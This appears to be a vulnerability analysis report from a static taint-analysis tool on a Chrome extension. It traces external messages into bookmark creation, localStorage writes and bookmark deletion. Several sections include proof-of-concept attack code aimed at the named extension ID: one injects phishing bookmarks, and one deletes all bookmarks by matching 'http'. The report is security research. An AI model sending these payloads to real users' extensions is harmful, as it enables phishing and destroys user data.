# CoCo Analysis: pdjmoegkkmdbohppjcnpfcggajjniepn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8

---

## Sink 1: bg_chrome_runtime_MessageExternal → BookmarkCreate_sink (URL)

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/pdjmoegkkmdbohppjcnpfcggajjniepn/opgen_generated_files/bg.js
Line 910  else if (request.addBookmarkUrl) {
          request.addBookmarkUrl
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `*://*.nubereader.es/*`
- `*://*.nubereader.odilotk.es/*`
- `*://*.bibliotecadigital.ceibal.edu.uy/*`
- `*://*.bibliotecapais.ceibal.edu.uy/*`
- `*://*.odilotk.es/*`
- `*://*.odilo.us/*`
- `*://*.server-nubereader.odilotk.es/*`
- `*://*.nubereader.odilo.us/*`
- `*://*.educarex.es/*`

**Attack Vector:** External messages from any of the domains listed in externally_connectable

**Code:**

```javascript
// Background script (bg.js line 905)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.addBookmarkUrl) {
        chrome.bookmarks.create({
            title: request.title, // ← attacker-controlled
            url: request.addBookmarkUrl // ← attacker-controlled
        });
        localStorage.setItem(request.addBookmarkUrl, request.bookCoverUrl); // ← storage pollution
        localStorage.setItem(request.addBookmarkUrl + "::expired", request.expired); // ← storage pollution
        sendResponse({success: true});
    }
});
```

**Attack:**

```javascript
// Malicious code on any whitelisted domain (e.g., nubereader.es)
chrome.runtime.sendMessage('pdjmoegkkmdbohppjcnpfcggajjniepn', {
  addBookmarkUrl: 'http://phishing-site.com/fake-login',
  title: 'Important Security Update - Click Here',
  bookCoverUrl: 'http://attacker.com/malicious-image.png',
  expired: 'never'
}, function(response) {
  console.log('Malicious bookmark injected');
});
```

**Impact:** Bookmark injection allowing attacker to add arbitrary bookmarks with misleading titles pointing to phishing or malware sites. Also pollutes localStorage with attacker-controlled data.

---

## Sink 2: bg_chrome_runtime_MessageExternal → BookmarkCreate_sink (title)

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/pdjmoegkkmdbohppjcnpfcggajjniepn/opgen_generated_files/bg.js
Line 912  title: request.title,
          request.title
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Same domains as Sink 1

**Attack Vector:** External messages from whitelisted domains

**Reason:** Same vulnerability as Sink 1, but tracking the title field specifically. Attacker controls the bookmark title, enabling social engineering attacks with deceptive bookmark names.

---

## Sink 3: bg_chrome_runtime_MessageExternal → localStorage_setItem_key

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/pdjmoegkkmdbohppjcnpfcggajjniepn/opgen_generated_files/bg.js
Line 910  else if (request.addBookmarkUrl) {
          request.addBookmarkUrl
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Same domains as Sink 1

**Attack Vector:** External messages from whitelisted domains

**Code:**

```javascript
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.addBookmarkUrl) {
        chrome.bookmarks.create({
            title: request.title,
            url: request.addBookmarkUrl
        });
        localStorage.setItem(request.addBookmarkUrl, request.bookCoverUrl); // ← attacker controls key
        localStorage.setItem(request.addBookmarkUrl + "::expired", request.expired);
        sendResponse({success: true});
    }
});
```

**Attack:**

```javascript
// Malicious code on whitelisted domain
chrome.runtime.sendMessage('pdjmoegkkmdbohppjcnpfcggajjniepn', {
  addBookmarkUrl: '__proto__', // Prototype pollution attempt
  title: 'malicious',
  bookCoverUrl: 'malicious_value',
  expired: 'never'
});
```

**Impact:** localStorage pollution with attacker-controlled keys. While localStorage prototype pollution is not as severe as Object prototype pollution, attacker can overwrite extension's own storage keys and corrupt its state.

---

## Sink 4: bg_chrome_runtime_MessageExternal → localStorage_setItem_value

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/pdjmoegkkmdbohppjcnpfcggajjniepn/opgen_generated_files/bg.js
Line 915  localStorage.setItem(request.addBookmarkUrl, request.bookCoverUrl);
          request.bookCoverUrl
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Same domains as Sink 1

**Attack Vector:** External messages from whitelisted domains

**Impact:** Attacker controls values written to localStorage, can inject malicious URLs or data that may be later retrieved and used by the extension.

---

## Sink 5: bg_chrome_runtime_MessageExternal → localStorage_setItem_key (expired field)

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/pdjmoegkkmdbohppjcnpfcggajjniepn/opgen_generated_files/bg.js
Line 910  else if (request.addBookmarkUrl) {
Line 916  localStorage.setItem(request.addBookmarkUrl + "::expired", request.expired);
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Same domains as Sink 1

**Attack Vector:** External messages from whitelisted domains

**Impact:** Similar to Sink 3 - localStorage key pollution.

---

## Sink 6: bg_chrome_runtime_MessageExternal → localStorage_setItem_value (expired field)

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/pdjmoegkkmdbohppjcnpfcggajjniepn/opgen_generated_files/bg.js
Line 916  localStorage.setItem(request.addBookmarkUrl + "::expired", request.expired);
          request.expired
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Same domains as Sink 1

**Attack Vector:** External messages from whitelisted domains

**Impact:** Attacker controls the "expired" value stored in localStorage.

---

## Sink 7: bg_chrome_runtime_MessageExternal → localStorage_remove_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/pdjmoegkkmdbohppjcnpfcggajjniepn/opgen_generated_files/bg.js
Line 919  else if(request.deleteBookmarkUrl) {
          request.deleteBookmarkUrl
Line 940  if (aNodes[i].url && aNodes[i].url.indexOf(url.toLowerCase()) > -1) {
          url.toLowerCase()
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Same domains as Sink 1

**Attack Vector:** External messages from whitelisted domains

**Code:**

```javascript
// Background script (bg.js line 919)
else if(request.deleteBookmarkUrl) {
    mThis.deleteBookmarks(request.deleteBookmarkUrl); // ← attacker-controlled URL
    localStorage.removeItem(request.deleteBookmarkUrl); // ← removes from storage
    sendResponse({success: true});
}

this.deleteBookmarks = function(url) {
    chrome.bookmarks.search({}, function(aNodes) {
        for (var i = 0; i < aNodes.length; i++) {
            if (aNodes[i].url && aNodes[i].url.indexOf(url.toLowerCase()) > -1) { // ← loose matching
                chrome.bookmarks.remove(aNodes[i].id); // ← removes bookmark
            }
        }
    });
};
```

**Attack:**

```javascript
// Malicious code on whitelisted domain
chrome.runtime.sendMessage('pdjmoegkkmdbohppjcnpfcggajjniepn', {
  deleteBookmarkUrl: 'http' // ← This would match ALL http bookmarks!
}, function(response) {
  console.log('Deleted all http bookmarks');
});
```

**Impact:** Bookmark deletion vulnerability. The code uses `.indexOf()` for matching, which is very loose. An attacker could delete ALL user bookmarks by providing a common substring like "http", ".", or "com". This is a severe denial of service attack on user's bookmarks.

---

## Sink 8: bg_chrome_runtime_MessageExternal → localStorage_remove_sink (duplicate)

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/pdjmoegkkmdbohppjcnpfcggajjniepn/opgen_generated_files/bg.js
Line 919  else if(request.deleteBookmarkUrl) {
          request.deleteBookmarkUrl
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Same domains as Sink 1

**Attack Vector:** External messages from whitelisted domains

**Reason:** Duplicate detection of same flow as Sink 7. Same vulnerability - attacker can remove localStorage entries via deleteBookmarkUrl request.

---

## Overall Summary

**True Positives: 8 vulnerabilities** (all unique flows, some tracking different parameters of same operation)

The extension has multiple vulnerabilities allowing any of 9 whitelisted domains to:
1. Inject malicious bookmarks with phishing URLs and deceptive titles
2. Pollute extension's localStorage with arbitrary key-value pairs
3. Delete user's bookmarks using loose substring matching (severe - can delete ALL bookmarks)
4. Remove localStorage entries

The most severe issue is Sink 7 - the bookmark deletion vulnerability that uses `indexOf()` matching, allowing an attacker to potentially delete all user bookmarks with a single request.
